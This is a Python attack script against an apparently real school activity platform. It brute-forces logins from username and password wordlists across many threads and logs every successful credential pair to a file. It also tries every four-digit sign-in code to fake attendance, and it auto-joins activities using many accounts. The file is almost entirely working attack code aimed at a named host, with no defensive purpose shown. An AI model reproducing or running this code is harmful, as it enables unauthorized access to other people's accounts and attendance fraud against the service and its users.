import json
import threading

import requests

flag = False
username = ''
password = ''

file1 = open('username.txt', mode='r', encoding='utf-8')
file2 = open('password.txt', mode='r', encoding='utf-8')


def dump_username():
    dic_username = file1.readlines()
    for i in range(len(dic_username)):
        dic_username[i] = dic_username[i].strip('\n')
    return dic_username


def dump_password():
    dic_password = file2.readlines()
    for i in range(len(dic_password)):
        dic_password[i] = dic_password[i].strip('\n')
    return dic_password


def login(session, username, password):
    url = 'http://aust.cliv2.dongst.cn/apps/common/login'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/86.0.4240.183 Safari/537.36',
        'x-token': '',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    session.headers = headers
    para = {"school": 10026, "account": username, "password": password}
    data = 'para=' + str(para)
    res = session.post(url=url, headers=headers, data=data)
    print(res.text)
    # if json.loads(res.text)['msg'] == "账号或密码错误":
    if json.loads(res.text)['msg'] == "SUCCESS":
        # print(res.headers)
        session.headers['x-token'] = res.headers['x-token']
        # for kvpair in session.headers.items():
        #     print('%s=%s' % kvpair)
        # print(res.text)
        flag = True
        with open('log.txt', mode='a+') as f:
            f.write(username + '\t' + password + '\n')
        return True
    else:
        return False


def logout(session):
    url = 'http://aust.cliv2.dongst.cn/apps/logout'
    res = session.post(url=url)


def getActivityClassify(session):
    url = 'http://aust.cliv2.dongst.cn/apps/comm/getActivityClassify?para={}'
    res = session.get(url=url)
    print(res.text)
    for obj in json.loads(res.text)['data']:
        print(obj)


def getActivityType(session):
    url = 'http://aust.cliv2.dongst.cn/apps/comm/getActivityType?para={}'
    res = session.get(url=url)
    for obj in json.loads(res.text)['data']:
        print(obj)
    # print(res.text)


def getActivity(session):
    url = 'http://aust.cliv2.dongst.cn/apps/activityImpl/list/getActivity?para={"oto":"0","cur":1,"size":20,"actiStatusId":"","actiClassId":"","actiTypeId":"","actiModeId":"0","name":""}'
    para = {"oto": "0", "cur": 1, "size": 20, "actiStatusId": "", "actiClassId": "", "actiTypeId": "",
            "actiModeId": "0", "name": ""}
    data = 'para=' + str(para)
    # res = session.get(url=url, data=data)
    res = session.get(url)
    l = json.loads(res.text)['data']['records']
    # print(l)
    # for obj in l:
    #    if obj['status'] == 1:
    #        print(obj)
    # print(json.loads(res.text)['data'])
    return l


def joinActivity(session, id: int):
    url = 'http://aust.cliv2.dongst.cn/apps/activityImpl/join'
    para = {"activityId": id}  # para=%7B%22activityId%22%3A91240%7D
    data = 'para=' + str(para)
    # res = session.get(url=url, data=data)
    res = session.post(url=url, data=data)
    # for obj in json.loads(res.text)['data']['records']:
    #    print(obj)
    print(res.text)


def joinAllActivity(session):
    l = getActivity(session)
    for obj in l:
        if obj['status'] == 1:
            # print(obj)
            joinActivity(session, obj['id'])


def SignInViaCode(session, code):
    url = 'http://aust.cliv2.dongst.cn/apps/activity/getactinfobycode?para=%7B%22code%22%3A%22' + str(code) + '%22%7D'
    res = session.get(url=url)
    print(code, end='\t')
    print(res.text)
    msg = json.loads(res.text)['msg']
    if msg != "无效数字码":
        if msg == "读取用户身份失败":
            login(session, username, password)
            SignInViaCode(session, code)
        else:
            with open('code.txt', mode='a+') as f:
                f.write(code + '\n')
            flag = True


def brutelogin():
    s = requests.session()
    dic_username = dump_username()
    dic_password = dump_password()
    flag = False
    total = len(dic_username) + len(dic_password)
    current = 0
    for username in dic_username:
        for password in dic_password:
            current += 1
            print('%.2f' % ((current / total) * 50) + '%', end='\t')
            # print(current/total)
            t = threading.Thread(target=login, args=(s, username, password))
            t.start()
            # login(s, username, password)
            if flag is True:
                logout(s)
                return True


def brutesigncode():
    s = requests.session()
    dic_username = dump_username()
    dic_password = dump_password()
    for i in range(len(dic_username)):
        username = dic_username[i]
        password = dic_password[i]
        login(s, username, password)
        flag = False
        for code in range(0, 9999):
            if flag is True:
                return
            code = str(code).rjust(4, '0')
            t = threading.Thread(target=SignInViaCode, args=(s, code))
            t.start()

        # time.sleep(0.000001)
        # signinwithcode(s, i)
    logout(s)


def joinAllActivityWithAllAccount():
    s = requests.session()
    dic_username = dump_username()
    dic_password = dump_password()
    for i in range(len(dic_username)):
        username = dic_username[i]
        password = dic_password[i]
        ret = login(s, username, password)
        if ret is False:
            continue
        joinAllActivity(s)
        logout(s)


if __name__ == '__main__':
    # print('ok')
    # s = requests.session()
    brutesigncode()
    # getActivityClassify(s)
    # getActivityType(s)
    # getActivity(s)
    # joinAllActivity(s)
    # joinAllActivityWithAllAccount()
    # logout(s)
    # brutelogin()
